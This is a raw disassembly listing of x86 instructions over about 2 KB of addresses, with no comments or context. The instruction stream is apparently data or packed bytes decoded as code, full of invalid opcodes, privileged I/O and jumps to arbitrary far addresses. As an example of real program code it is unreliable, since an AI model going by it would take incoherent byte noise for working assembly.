  4304ef:	jecxz  0x4304e6
  4304f1:	es mov esp,0x6d016ef7
  4304f7:	aaa    
  4304f8:	xchg   esi,eax
  4304f9:	std    
  4304fa:	sub    BYTE PTR [eax+ecx*4],bh
  4304fd:	xchg   DWORD PTR [edx],eax
  4304ff:	fst    st(4)
  430501:	push   es
  430502:	and    dh,BYTE PTR [esi+0x7a]
  430505:	mov    ch,0x8b
  430507:	adc    esi,eax
  430509:	push   edx
  43050a:	inc    ebx
  43050b:	mov    ebx,0xe63711d0
  430510:	shl    esi,0xd3
  430513:	push   cs
  430514:	mov    eax,0x5d404db
  430519:	call   0x103d1d5e
  43051e:	popa   
  43051f:	xchg   edx,eax
  430520:	xor    eax,0x8b544b00
  430525:	inc    edx
  430526:	push   ds
  430527:	lds    ebx,FWORD PTR [edx-0x6a4f47de]
  43052d:	xor    bl,BYTE PTR [eax-0x75]
  430530:	mul    eax
  430532:	jb     0x4305a1
  430534:	je     0x430546
  430536:	fsubr  QWORD PTR [eax-0x54]
  430539:	adc    al,0xb8
  43053b:	or     BYTE PTR [esi-0x42],bh
  43053e:	inc    ecx
  43053f:	in     al,dx
  430540:	or     bh,BYTE PTR [edx-0x2c1bfeb9]
  430546:	xor    eax,0x452addb5
  43054b:	xor    al,0xe5
  43054d:	std    
  43054e:	adc    DWORD PTR [eax],0xda534b6
  430554:	xor    BYTE PTR [esi-0x78d34723],0x2c
  43055b:	mov    edi,0x1b010a37
  430560:	pop    edx
  430561:	pop    ss
  430562:	test   al,0xe4
  430564:	cmp    BYTE PTR [edx+0x10536d88],0xe8
  43056b:	dec    esp
  43056d:	mov    edi,fs
  43056f:	fild   DWORD PTR [eax]
  430571:	ror    BYTE PTR [esi+0x2c260dfa],1
  430577:	fimul  WORD PTR [ecx+0x1adc562]
  43057d:	push   0xb0c105ed
  430582:	pop    edi
  430583:	loopne 0x43059f
  430585:	mov    al,ds:0xd66244d8
  43058a:	jo     0x4305b3
  43058c:	inc    edx
  43058d:	fsubr  DWORD PTR [esi]
  43058f:	xor    eax,0x27293708
  430594:	mov    ebp,es
  430596:	inc    ebx
  430597:	imul   eax,DWORD PTR [ecx+0x5b],0x5b
  43059b:	mov    esi,DWORD PTR [edx-0x17]
  43059e:	push   eax
  43059f:	jne    0x430560
  4305a1:	xor    eax,0x74b01576
  4305a6:	inc    edx
  4305a7:	bound  edx,QWORD PTR [eax-0x5b]
  4305aa:	(bad)  
  4305ab:	or     bh,BYTE PTR [eax]
  4305ad:	mov    dh,0x85
  4305af:	cs stos BYTE PTR es:[edi],al
  4305b1:	pusha  
  4305b2:	popa   
  4305b3:	xchg   esp,eax
  4305b4:	xor    ebp,DWORD PTR [edi]
  4305b6:	jo     0x4305ce
  4305b8:	shl    BYTE PTR [esi-0x52f0b1fe],1
  4305be:	sub    dl,BYTE PTR [edi+0x51]
  4305c1:	pop    ss
  4305c2:	fidivr DWORD PTR ds:0x6ef29759
  4305c8:	lahf   
  4305c9:	rcl    BYTE PTR [edx+0x54],0x61
  4305cd:	imul   DWORD PTR [edi+0x4b44376d]
  4305d3:	ins    DWORD PTR es:[edi],dx
  4305d4:	pop    ebx
  4305d5:	pop    ss
  4305d6:	or     cl,dl
  4305d8:	and    BYTE PTR [edi+0x3e],ah
  4305db:	std    
  4305dc:	pushf  
  4305dd:	shr    BYTE PTR [eax],0x6c
  4305e0:	mov    BYTE PTR [esi+0x11],ch
  4305e3:	jl     0x430605
  4305e5:	retf   0xb428
  4305e8:	sub    esp,DWORD PTR [eax]
  4305ea:	ss push 0x59
  4305ed:	aaa    
  4305ee:	js     0x4305c7
  4305f0:	js     0x4305fb
  4305f2:	jno    0x430655
  4305f4:	fistp  DWORD PTR [edx]
  4305f6:	imul   eax,ebp,0x94e64ff2
  4305fc:	pop    eax
  4305fd:	cmp    esi,DWORD PTR [ebp*4-0x37ae257d]
  430604:	jns    0x43065f
  430606:	sub    DWORD PTR [edx+eax*1],eax
  430609:	scas   al,BYTE PTR es:[edi]
  43060a:	mov    ds:0x2286a8a5,al
  43060f:	cmp    bl,bh
  430611:	pop    ebx
  430612:	pop    ss
  430613:	add    eax,0x1428d1db
  430618:	in     eax,dx
  430619:	xor    BYTE PTR [eax-0x7e6f92d7],bl
  43061f:	cs test al,0x4c
  430622:	fldcw  WORD PTR [edx+0x16dc5136]
  430628:	pop    edx
  430629:	and    BYTE PTR [esi-0x6968f4a2],bh
  43062f:	fcmovnb st,st(2)
  430631:	push   edx
  430632:	add    ecx,DWORD PTR [eax]
  430634:	test   al,0xf2
  430636:	ss popa 
  430638:	or     edx,esp
  43063a:	or     dl,al
  43063c:	xchg   esi,eax
  43063d:	cs mov ah,0x29
  430640:	dec    ebp
  430641:	cli    
  430642:	pop    eax
  430643:	add    BYTE PTR [eax+edx*1+0x6b],0x6d
  430648:	dec    ebx
  430649:	inc    ebp
  43064a:	mov    ebx,0x2f1dad2e
  43064f:	xchg   ecx,eax
  430650:	icebp  
  430651:	xor    ah,BYTE PTR [ecx]
  430653:	xchg   esi,eax
  430654:	lods   eax,DWORD PTR ds:[esi]
  430655:	pop    ebp
  430656:	adc    al,0xd4
  430658:	pop    esi
  430659:	repz xor DWORD PTR [ecx-0x6a],ecx
  43065d:	or     eax,0x67029a80
  430662:	call   0x41af:0xb6d8d8ca
  430669:	push   0xffffffa7
  43066b:	sub    al,0xcb
  43066d:	mov    edi,0x5b801576
  430672:	stc    
  430673:	lods   eax,DWORD PTR ds:[esi]
  430674:	pop    ebp
  430675:	and    dl,BYTE PTR [eax-0x12]
  430678:	pop    ss
  430679:	loopne 0x4306b8
  43067b:	aas    
  43067c:	add    BYTE PTR [esi-0x32],ah
  43067f:	mov    ebx,edi
  430681:	pop    es
  430682:	inc    esp
  430683:	fwait
  430684:	sbb    dh,0x1f
  430687:	gs jmp 0xd345:0x283a28db
  43068f:	push   ss
  430690:	es xor al,0xb4
  430693:	push   eax
  430694:	cmp    BYTE PTR [edx+0x31fb6410],0x35
  43069b:	mov    ebx,ebx
  43069d:	ret    0xfbb6
  4306a0:	jmp    0x3b32:0x6fe98fe6
  4306a7:	adc    DWORD PTR [esp+esi*4-0x44],esp
  4306ab:	jno    0x430698
  4306ad:	mov    esp,es
  4306af:	sbb    BYTE PTR [edx+0x69],ah
  4306b2:	add    BYTE PTR [eax],al
  4306b4:	in     al,dx
  4306b5:	loopne 0x43069d
  4306b7:	bound  ebp,QWORD PTR [ebx]
  4306b9:	add    DWORD PTR [edi],esp
  4306bb:	sbb    ch,BYTE PTR [edi-0x54567949]
  4306c1:	stos   BYTE PTR es:[edi],al
  4306c2:	in     eax,dx
  4306c3:	jmp    0x59bc:0x32ab650d
  4306ca:	mov    bh,0xd2
  4306cc:	jb     0x43072f
  4306ce:	adc    DWORD PTR [ecx],ebx
  4306d0:	push   0x4c
  4306d2:	dec    ebx
  4306d3:	add    dh,BYTE PTR [esi+ebx*8+0x4d]
  4306d7:	add    eax,0xbb0a9637
  4306dc:	je     0x430752
  4306de:	ret    
  4306df:	es jmp 0x4306cf
  4306e2:	ret    0x1742
  4306e5:	push   ecx
  4306e6:	call   0x67c2a704
  4306eb:	pushf  
  4306ec:	pop    edi
  4306ed:	mov    dh,0xb0
  4306ef:	ins    DWORD PTR es:[edi],dx
  4306f0:	xchg   ebp,eax
  4306f1:	inc    esi
  4306f2:	jl     0x430677
  4306f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4306f5:	sbb    al,0xa9
  4306f7:	mov    al,0x3b
  4306f9:	jo     0x4306e6
  4306fb:	sub    ah,dl
  4306fd:	push   cs
  4306fe:	cld    
  4306ff:	rcr    DWORD PTR [eax],cl
  430701:	(bad)  
  430702:	and    al,0x5
  430704:	ins    DWORD PTR es:[edi],dx
  430705:	rcl    BYTE PTR [esi+0x43],1
  430708:	gs xor al,0x37
  43070b:	out    0x43,al
  43070d:	push   edx
  43070e:	in     eax,dx
  43070f:	push   edx
  430710:	pop    es
  430711:	mov    ah,0x8
  430713:	loopne 0x430703
  430715:	repnz mov ecx,0xd4656e1f
  43071b:	inc    esi
  43071c:	mov    ch,0x6d
  43071e:	retf   
  43071f:	cmp    edx,DWORD PTR [edi]
  430721:	inc    edx
  430722:	or     bh,BYTE PTR [ebx+0x76d80886]
  430728:	mov    ebp,0xea71da62
  43072d:	xchg   BYTE PTR [ecx+0xa],dl
  430730:	sub    dh,BYTE PTR [edi-0x319d64a0]
  430736:	outs   dx,BYTE PTR ds:[esi]
  430737:	push   0x3fba08bb
  43073c:	cs leave 
  43073e:	dec    DWORD PTR [edx]
  430740:	(bad)  
  430741:	(bad)  
  430742:	adc    al,0x71
  430744:	fistp  DWORD PTR [eax+0x16]
  430747:	dec    edx
  430748:	mov    ah,BYTE PTR [ebx]
  43074a:	sub    DWORD PTR [ebx],esp
  43074c:	mov    gs,WORD PTR [esi]
  43074e:	or     BYTE PTR [ebx],0x74
  430751:	nop
  430752:	loop   0x4306f9
  430754:	jno    0x4306f4
  430756:	jae    0x43075c
  430758:	pop    ss
  430759:	pop    edx
  43075a:	mov    bh,0x7c
  43075c:	sahf   
  43075d:	das    
  43075e:	push   esp
  43075f:	push   ss
  430760:	popf   
  430761:	imul   BYTE PTR [ecx+0x1db5b880]
  430767:	adc    ebp,DWORD PTR [edx]
  430769:	add    dh,BYTE PTR [eax-0x4fb8392f]
  43076f:	ins    DWORD PTR es:[edi],dx
  430770:	fdivr  QWORD PTR [edx]
  430772:	rcr    dh,0x98
  430775:	pusha  
  430776:	test   esi,esi
  430778:	(bad)  [ebx]
  43077a:	xor    BYTE PTR [eax+0x241d6c6d],dh
  430780:	add    DWORD PTR [esp+edi*4],edx
  430783:	and    al,0xfe
  430785:	mov    esp,0x2bab7586
  43078a:	mov    eax,0x65a79558
  43078f:	sub    BYTE PTR [ebp+0x35],0xc2
  430793:	or     al,BYTE PTR [ebp-0x73]
  430796:	test   al,0x70
  430798:	scas   al,BYTE PTR es:[edi]
  430799:	xchg   BYTE PTR [ebx+0x5],cl
  43079c:	push   0x17
  43079e:	pop    ebx
  43079f:	shr    BYTE PTR [edx+0x7665a4bc],cl
  4307a5:	ror    BYTE PTR [ebp-0x75d87f52],0xd2
  4307ac:	or     DWORD PTR [edi-0x2a8bbfff],esi
  4307b2:	add    BYTE PTR ds:0x9a0d0e72,dl
  4307b8:	or     BYTE PTR [eax+0x13],ah
  4307bb:	test   eax,0x6afcfffa
  4307c0:	push   ss
  4307c1:	cmp    ch,BYTE PTR [eax-0x733a00fa]
  4307c7:	and    bh,BYTE PTR [edi+0x6b]
  4307ca:	or     cl,BYTE PTR [esi+0x5323e6e8]
  4307d0:	repz test al,0x15
  4307d3:	loopne 0x430777
  4307d5:	mov    dh,0x3
  4307d7:	add    dl,BYTE PTR [edi]
  4307d9:	jmp    0x4307d5
  4307db:	retf   
  4307dc:	mov    dh,0xed
  4307de:	(bad)  
  4307df:	push   esi
  4307e0:	cmp    al,0xc2
  4307e2:	mov    bh,BYTE PTR [edi+0x70]
  4307e5:	jno    0x430770
  4307e7:	popa   
  4307e8:	push   cs
  4307e9:	in     al,dx
  4307ea:	arpl   WORD PTR [ebx-0x45],bp
  4307ed:	mov    ah,BYTE PTR [ebp+ecx*8+0x43ef2f46]
  4307f4:	loope  0x430851
  4307f6:	push   ebx
  4307f7:	aad    0x76
  4307f9:	into   
  4307fa:	pop    ecx
  4307fb:	lods   eax,DWORD PTR ds:[esi]
  4307fc:	inc    eax
  4307fd:	mov    eax,ds:0x455da1e8
  430802:	sbb    eax,DWORD PTR [eax+0x68c2b1b6]
  430808:	sub    DWORD PTR [ebp-0x70],ebp
  43080b:	loopne 0x4307d3
  43080d:	inc    esi
  43080e:	pop    ss
  43080f:	cmp    edi,DWORD PTR ds:0xbea2ff3f
  430815:	mov    ebp,0xa09ad885
  43081a:	xor    eax,0x1eb341ae
  43081f:	sub    DWORD PTR [edx+0x6f8c6ed4],edi
  430825:	ins    DWORD PTR es:[edi],dx
  430826:	push   ebx
  430827:	or     esp,DWORD PTR [eax+edx*4-0x26]
  43082b:	sbb    al,0x51
  43082e:	mov    ah,0x39
  430830:	shl    BYTE PTR [ecx-0x3d],1
  430833:	icebp  
  430834:	fwait
  430835:	mov    DWORD PTR [ebp-0x5abd1dda],ecx
  43083b:	hlt    
  43083c:	popf   
  43083d:	(bad)  
  43083f:	test   DWORD PTR [esi],ebp
  430841:	sub    BYTE PTR [esi-0x3b],0xec
  430845:	cmp    ch,cl
  430847:	mov    edi,0x222d8852
  43084c:	fidiv  DWORD PTR [edx+0x32d46860]
  430852:	adc    BYTE PTR [esp+ebp*8],al
  430855:	add    BYTE PTR [ebx],cl
  430857:	or     dl,bl
  430859:	test   DWORD PTR [esi+0x9b5d802],ecx
  43085f:	mov    ch,0x33
  430861:	arpl   WORD PTR [ebp+0x41],dx
  430864:	fld    TBYTE PTR [ebp-0x6d56dc53]
  43086a:	mov    ebx,0x12dac95f
  43086f:	sub    BYTE PTR [eax-0x7eaaa24b],bh
  430875:	jnp    0x430845
  430877:	repnz pop edx
  430879:	adc    eax,0xeb70151d
  43087e:	dec    eax
  43087f:	clc    
  430880:	ret    0xdbc6
  430883:	(bad)  
  430885:	pop    edx
  430886:	push   esp
  430887:	sbb    ecx,DWORD PTR [ebx]
  430889:	shl    BYTE PTR ds:0x807a5b0c,1
  43088f:	lods   eax,DWORD PTR ds:[esi]
  430890:	mov    cl,0xdd
  430892:	ficom  DWORD PTR [ebp-0x6f80e59a]
  430898:	add    eax,0x806aa5ee
  43089d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43089e:	sub    dl,cl
  4308a0:	inc    esi
  4308a1:	cmpps  xmm0,xmm5,0xad
  4308a5:	mov    ds:0x7568c4a8,eax
  4308aa:	dec    ebp
  4308ab:	test   BYTE PTR [esi+0x4b],dh
  4308ae:	or     eax,0x3eaed40
  4308b3:	and    esp,DWORD PTR [eax+0x29ad36fe]
  4308b9:	mov    edx,0xec89896d
  4308be:	lods   al,BYTE PTR ds:[esi]
  4308bf:	scas   al,BYTE PTR es:[edi]
  4308c0:	pop    ecx
  4308c1:	mov    esi,0x41d0b94a
  4308c6:	lds    esp,FWORD PTR [esi]
  4308c8:	push   edx
  4308c9:	sbb    DWORD PTR [edi-0x3c],0xab76246a
  4308d0:	and    DWORD PTR [edx+0x56],0x45
  4308d4:	fldcw  WORD PTR [eax]
  4308d6:	neg    DWORD PTR [esp+ebx*2-0x24eeab2a]
  4308dd:	in     al,0xaa
  4308df:	xchg   ebp,eax
  4308e0:	test   al,0x6e
  4308e2:	or     BYTE PTR [ecx-0x15],dh
  4308e5:	mov    ds:0xcb79e1e8,al
  4308ea:	cld    
  4308eb:	push   ebx
  4308ec:	jno    0x4308e0
  4308ee:	or     dh,BYTE PTR [esi-0x4a86efe3]
  4308f4:	push   es
  4308f5:	stos   BYTE PTR es:[edi],al
  4308f6:	sub    BYTE PTR [eax-0x1d71727b],al
  4308fc:	xchg   esi,eax
  4308fd:	jne    0x4308e4
  4308ff:	push   0xffffffb7
  430901:	ins    DWORD PTR es:[edi],dx
  430902:	fist   DWORD PTR [esi-0x5f]
  430905:	data16 fs in al,0xd1
  430909:	mov    ebx,0x1754d414
  43090e:	dec    edx
  43090f:	mov    cl,0x98
  430911:	jmp    0x4308aa
  430913:	xor    al,0xa7
  430915:	mov    edx,0x4c154532
  43091a:	add    BYTE PTR [ebp+0x1136aae5],ah
  430920:	rcl    BYTE PTR [esp+edi*4+0x5a],1
  430924:	fwait
  430925:	add    eax,0xe86b77a
  43092a:	not    BYTE PTR [eax+0x24]
  43092d:	dec    eax
  43092e:	mov    esp,0xad85db7d
  430933:	lea    edx,[edx]
  430935:	or     al,0x29
  430937:	and    cl,dh
  430939:	aaa    
  43093a:	daa    
  43093b:	inc    ebx
  43093c:	dec    edx
  43093d:	mov    esi,0x10436d45
  430942:	rcl    BYTE PTR [edi+0x40d8291e],0xd4
  430949:	mov    dh,0xb3
  43094b:	in     al,dx
  43094c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43094d:	sub    ch,dh
  43094f:	sahf   
  430950:	lods   al,BYTE PTR ds:[esi]
  430951:	and    DWORD PTR [esi-0x4ccc291e],0x3a37701d
  43095b:	lock test al,0x4b
  43095e:	pop    ebp
  43095f:	jno    0x430928
  430961:	xchg   edi,eax
  430962:	fsubr  DWORD PTR [edi+0xcd822a7]
  430968:	les    ebp,FWORD PTR [ebp+0x1475870b]
  43096e:	push   es
  43096f:	jmp    0x27a6:0x8ddb6b0d
  430976:	adc    ah,BYTE PTR [ebp-0x7d6a50c1]
  43097c:	outs   dx,BYTE PTR ds:[esi]
  43097d:	pop    esp
  43097e:	stos   BYTE PTR es:[edi],al
  43097f:	mov    edx,0xc3677cb1
  430984:	add    BYTE PTR [ebp-0x45841eea],bh
  43098a:	sbb    BYTE PTR [ebp+0x1],0xed
  43098e:	scas   eax,DWORD PTR es:[edi]
  43098f:	imul   ebp,DWORD PTR [edx+0x3a],0x53
  430993:	add    DWORD PTR [edx],0x17
  430996:	mov    ch,0x89
  430998:	in     al,dx
  430999:	and    BYTE PTR [edx+ebp*1-0x25a2aa25],dh
  4309a0:	push   ebp
  4309a1:	jp     0x4309c3
  4309a3:	or     ch,BYTE PTR [eax]
  4309a5:	inc    edi
  4309a6:	sbb    dl,0xfb
  4309a9:	push   0xffffffa1
  4309ab:	adc    BYTE PTR [ebx+0xe],bl
  4309ae:	push   ds
  4309af:	stos   DWORD PTR es:[edi],eax
  4309b0:	push   0xffffffe0
  4309b2:	fsub   DWORD PTR [eax]
  4309b4:	js     0x43093e
  4309b6:	push   ss
  4309b7:	test   al,0x46
  4309b9:	mov    esp,0xd83f6b76
  4309be:	and    al,0x74
  4309c0:	xchg   ebp,eax
  4309c1:	sbb    eax,DWORD PTR [esi-0x4280dc05]
  4309c7:	aam    0x15
  4309c9:	fcomp  QWORD PTR [eax-0x4a]
  4309cc:	outs   dx,BYTE PTR ds:[esi]
  4309cd:	sub    esi,esi
  4309cf:	mov    ah,0x7d
  4309d1:	loope  0x430955
  4309d3:	outs   dx,BYTE PTR ds:[esi]
  4309d4:	ins    DWORD PTR es:[edi],dx
  4309d5:	pop    es
  4309d6:	add    edi,ebp
  4309d8:	out    0x9b,eax
  4309da:	out    dx,eax
  4309db:	adc    eax,0x8895b8ac
  4309e0:	mov    ?,esp
  4309e2:	gs enter 0x8dc5,0x6a
  4309e7:	fcomp  st(2)
  4309e9:	scas   al,BYTE PTR es:[edi]
  4309ea:	or     BYTE PTR [ebp+0x6a],cl
  4309ed:	sar    BYTE PTR [ebx+edi*1+0x54174484],1
  4309f4:	xchg   edi,eax
  4309f5:	sub    eax,DWORD PTR [edi]
  4309f7:	mov    ebx,0xc0517d44
  4309fc:	jbe    0x430a69
  4309fe:	mov    WORD PTR [edi+0x46],?
  430a01:	and    eax,0xeab75f08
  430a06:	mov    ds:0x4e9eefda,al
  430a0b:	ja     0x4309a6
  430a0d:	dec    edx
  430a0e:	leave  
  430a0f:	inc    ecx
  430a10:	outs   dx,BYTE PTR ds:[esi]
  430a11:	lea    ebx,[edx+0x2a]
  430a14:	es inc edi
  430a16:	iret   
  430a17:	push   eax
  430a18:	cmc    
  430a19:	inc    ebp
  430a1a:	push   ss
  430a1b:	mov    dh,0x6
  430a1d:	xor    BYTE PTR [edi-0x4e],0x29
  430a21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430a22:	sbb    al,0xdf
  430a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430a25:	test   DWORD PTR [ebp-0x25],ebp
  430a28:	or     edx,DWORD PTR [ebx]
  430a2a:	out    0x3d,al
  430a2c:	mov    edx,ebp
  430a2e:	pop    ds
  430a2f:	mov    ah,0x35
  430a31:	add    ah,BYTE PTR [edx+0x13]
  430a34:	shl    ch,0x55
  430a37:	sahf   
  430a38:	dec    eax
  430a39:	dec    edi
  430a3a:	adc    eax,0x71bb1576
  430a3f:	out    dx,al
  430a40:	cmp    BYTE PTR [ebx],al
  430a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a43:	mov    ecx,0x1aa296ac
  430a48:	mov    ch,0x7d
  430a4a:	xchg   edi,eax
  430a4b:	sub    eax,0xd041c00a
  430a50:	mov    dh,0x9
  430a52:	jecxz  0x430ac6
  430a54:	ins    BYTE PTR es:[edi],dx
  430a55:	out    0x8d,al
  430a57:	push   ecx
  430a58:	call   0x22eae45d
  430a5d:	dec    edi
  430a5e:	icebp  
  430a5f:	cdq    
  430a60:	inc    esi
  430a61:	in     eax,0xe8
  430a63:	sub    BYTE PTR [edx+0x12879da3],0xad
  430a6a:	scas   al,BYTE PTR es:[edi]
  430a6b:	sub    bh,BYTE PTR [eax+0xd781843]
  430a71:	scas   al,BYTE PTR es:[edi]
  430a72:	jns    0x430ab6
  430a74:	inc    ebx
  430a75:	(bad)  
  430a77:	fldcw  WORD PTR [ebp+0x12eafbb3]
  430a7d:	jnp    0x430a87
  430a7f:	xor    al,0x41
  430a81:	add    al,0xbb
  430a83:	call   0xd3a2cef6
  430a88:	retf   0xe01a
  430a8b:	inc    edx
  430a8c:	fstp   TBYTE PTR [ecx-0x26fa81a7]
  430a92:	sub    al,0x99
  430a94:	push   ss
  430a95:	mov    bh,0x80
  430a97:	jbe    0x430add
  430a99:	fdivr  QWORD PTR [esi]
  430a9b:	xchg   ebp,eax
  430a9c:	bound  esi,QWORD PTR [eax-0x71]
  430a9f:	dec    esp
  430aa0:	inc    edi
  430aa1:	inc    eax
  430aa2:	mov    bh,0xae
  430aa4:	or     BYTE PTR [esi+0x3b],0xe2
  430aa8:	cli    
  430aa9:	add    BYTE PTR ds:0xf8622a6d,ch
  430aaf:	pop    esi
  430ab0:	ret    0x7a53
  430ab3:	xor    eax,0x5368068a
  430ab8:	mov    al,0xa7
  430aba:	adc    ecx,DWORD PTR [ecx]
  430abc:	jo     0x430ad2
  430abe:	mov    edi,0xdb1adb71
  430ac3:	or     esp,eax
  430ac5:	pop    edi
  430ac6:	(bad)  ds:0x70ad029b
  430acc:	mov    ds:0xb14175b0,al
  430ad1:	dec    esi
  430ad2:	dec    esi
  430ad3:	cmp    DWORD PTR [edx+0x2f],edx
  430ad6:	loopne 0x430a6f
  430ad8:	cmp    al,BYTE PTR [edx]
  430ada:	mov    edx,0x7bb8dcca
  430adf:	inc    ebx
  430ae0:	inc    ecx
  430ae1:	sub    DWORD PTR [ebx+0x76228],ebp
  430ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430ae8:	add    ecx,DWORD PTR [edx+0x6c1135ba]
  430aee:	adc    esp,DWORD PTR [ebp+ebx*8-0x194cb0e5]
  430af5:	retf   0x625c
  430af8:	jmp    0x430a9a
  430afa:	std    
  430afb:	mov    edx,0x78469cef
  430b00:	inc    eax
  430b01:	or     BYTE PTR [ebx],0x4d
  430b04:	add    BYTE PTR [ecx-0x47],bh
  430b07:	pop    eax
  430b08:	repnz push ebp
  430b0a:	add    bl,dl
  430b0c:	add    ah,BYTE PTR [ecx+0x1d]
  430b0f:	inc    eax
  430b10:	ds es ss inc ebp
  430b14:	mov    cl,0x5d
  430b16:	adc    ch,BYTE PTR [edi-0x1e1131ca]
  430b1c:	retf   
  430b1d:	xchg   esi,eax
  430b1e:	inc    esp
  430b1f:	cmp    esp,DWORD PTR [edx-0x5f97eb28]
  430b25:	ror    DWORD PTR [eax+0x5d545adc],cl
  430b2b:	iret   
  430b2c:	pop    eax
  430b2d:	je     0x430b1b
  430b2f:	adc    eax,0x5db52e50
  430b34:	inc    esp
  430b35:	xchg   edx,eax
  430b36:	setle  BYTE PTR [edx+esi*1-0x49c9a8e0]
  430b3e:	push   es
  430b3f:	or     al,BYTE PTR [edi+0x18dddd05]
  430b45:	xor    al,bl
  430b47:	sub    ch,BYTE PTR [eax+0x17]
  430b4a:	add    BYTE PTR [edi+0x3b],0x14
  430b4e:	mov    dl,0x27
  430b50:	push   0xffffffda
  430b52:	call   0xdf2fb579
  430b57:	jno    0x430ae2
  430b59:	(bad)  
  430b5b:	inc    ebp
  430b5c:	in     al,dx
  430b5d:	xor    BYTE PTR [esi],0x26
  430b60:	jp     0x430bb1
  430b62:	fild   DWORD PTR [ebp+0x1dd68dd6]
  430b68:	in     eax,dx
  430b69:	add    dh,dl
  430b6b:	xor    eax,0x16830eb6
  430b70:	mov    ah,0x5d
  430b72:	inc    ebp
  430b73:	pop    ss
  430b74:	jae    0x430b5c
  430b76:	clc    
  430b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430b78:	or     dl,bl
  430b7a:	inc    esp
  430b7b:	aam    0xf2
  430b7d:	add    al,BYTE PTR [ecx-0x79]
  430b80:	pop    ebx
  430b81:	pop    ebx
  430b82:	sub    BYTE PTR [ecx],bl
  430b84:	push   ecx
  430b85:	iret   
  430b86:	adc    BYTE PTR [edx],bh
  430b88:	mov    eax,ds:0xb6e0eb65
  430b8d:	aam    0xb6
  430b8f:	mov    ebp,0xc5f57911
  430b94:	fisttp DWORD PTR [esi]
  430b96:	adc    edx,ebx
  430b98:	adc    DWORD PTR [ebx+ebx*4+0x20],ebp
  430b9c:	cmp    dl,0xf3
  430b9f:	stos   BYTE PTR es:[edi],al
  430ba0:	std    
  430ba1:	mov    ah,0x8b
  430ba3:	pusha  
  430ba4:	pop    ss
  430ba5:	inc    edx
  430ba6:	test   al,0x42
  430ba8:	(bad)  
  430ba9:	mov    al,0x70
  430bab:	push   esp
  430bac:	ins    BYTE PTR es:[edi],dx
  430bad:	xor    al,0x5
  430baf:	inc    ecx
  430bb0:	inc    ebx
  430bb1:	mov    bh,0xf3
  430bb3:	inc    edx
  430bb4:	fstp   TBYTE PTR [esi-0x50]
  430bb7:	xchg   edi,eax
  430bb8:	shr    esp,0xd6
  430bbb:	mov    DWORD PTR [eax],edi
  430bbd:	add    edi,DWORD PTR [edx-0x3f]
  430bc0:	mov    ch,0x1b
  430bc2:	pop    ebx
  430bc3:	in     eax,dx
  430bc4:	int3   
  430bc5:	enter  0x1cb3,0xed
  430bc9:	cmp    DWORD PTR [edi+0x6b72665],esp
  430bcf:	call   0x4816148a
  430bd4:	pop    ss
  430bd5:	stos   BYTE PTR es:[edi],al
  430bd6:	das    
  430bd7:	repz ds out dx,eax
  430bda:	mov    cs,WORD PTR [ebx-0x9e4fe8a]
  430be0:	imul   eax,DWORD PTR [esp+edi*1+0x7680d15c],0xffffffd0
  430be8:	mov    dh,0x59
  430bea:	aaa    
  430beb:	sbb    DWORD PTR [ebx+0x7f],0x6a
  430bef:	mov    esi,0x9a0050bb
  430bf4:	fcmovnb st,st(3)
  430bf6:	imul   edi,DWORD PTR [esi-0x394ccce8],0x3d6086ad
  430c00:	ret    0xcaef
  430c03:	pop    ebx
  430c04:	mov    esp,0x2a51bb24
  430c09:	retf   0x7358
  430c0c:	ins    BYTE PTR es:[edi],dx
  430c0d:	arpl   sp,di
  430c0f:	xor    ch,BYTE PTR [eax-0x55a47575]
  430c15:	cwde   
  430c16:	sahf   
  430c17:	jl     0x430c60
  430c19:	push   cs
  430c1a:	mov    bl,al
  430c1c:	xchg   esi,eax
  430c1d:	jne    0x430c87
  430c1f:	adc    DWORD PTR [edi-0x5f],edx
  430c22:	pusha  
  430c23:	inc    edi
  430c24:	push   ecx
  430c25:	mov    bh,0x70
  430c27:	retf   
  430c28:	pop    ecx
  430c29:	inc    ecx
  430c2a:	xor    cl,BYTE PTR [edi-0x797a4a36]
  430c30:	mov    gs,ebx
  430c32:	hlt    
  430c33:	aaa    
  430c34:	adc    BYTE PTR [edi+0x18],cl
  430c37:	ja     0x430c14
  430c39:	cmp    ah,BYTE PTR [eax]
  430c3b:	mov    eax,0x978c9614
  430c40:	xor    al,0x29
  430c42:	mov    WORD PTR [ebp+0x75],cs
  430c45:	add    DWORD PTR [ebp+0x61],esi
  430c48:	sahf   
  430c49:	sub    al,al
  430c4b:	pop    es
  430c4c:	mov    ebp,0x62bb6d31
  430c51:	mov    ebx,0x6bda6865
  430c56:	adc    BYTE PTR [edx],0x79
  430c59:	add    al,0x35
  430c5b:	and    al,0x88
  430c5d:	mov    edx,0xb3685fb5
  430c62:	or     eax,0x24421a6e
  430c67:	ins    DWORD PTR es:[edi],dx
  430c68:	add    edx,DWORD PTR [ecx]
  430c6a:	mov    ebx,0x5e1dfc1
  430c6f:	jb     0x430ce2
  430c71:	sub    al,0xdb
  430c73:	lods   eax,DWORD PTR ds:[esi]
  430c74:	scas   al,BYTE PTR es:[edi]
  430c75:	sub    BYTE PTR [ecx],0x99
  430c78:	jmp    0x430c47
  430c7a:	out    dx,al
  430c7b:	jmp    0x430c94
  430c7d:	sbb    ebp,esp
  430c7f:	and    dh,BYTE PTR [esi]
  430c81:	push   ecx
  430c82:	adc    ecx,DWORD PTR [ecx+0x5520f7a8]
  430c88:	sub    al,0x55
  430c8a:	pop    ebp
  430c8b:	inc    ecx
  430c8c:	nop
  430c8d:	fldcw  WORD PTR [eax+eiz*1-0x58]
  430c91:	fdiv   DWORD PTR [esi+0x54]
  430c94:	pop    esp
  430c95:	xchg   DWORD PTR [eax+0x7451e20e],esi
  430c9b:	imul   edi,DWORD PTR [ebx+0x443adc07],0x23
  430ca2:	aas    
  430ca3:	imul   esi,DWORD PTR [ebp-0x5d],0x4
  430ca7:	aad    0x49
  430ca9:	or     dh,BYTE PTR [edi-0x43]
  430cac:	xchg   edx,eax
  430cad:	xchg   edi,eax
  430cae:	jo     0x430ca9
  430cb0:	push   edx
  430cb1:	adc    esp,DWORD PTR [edx+ebp*4+0x38]
  430cb5:	jmp    DWORD PTR [eax]
  430cb7:	add    dh,al
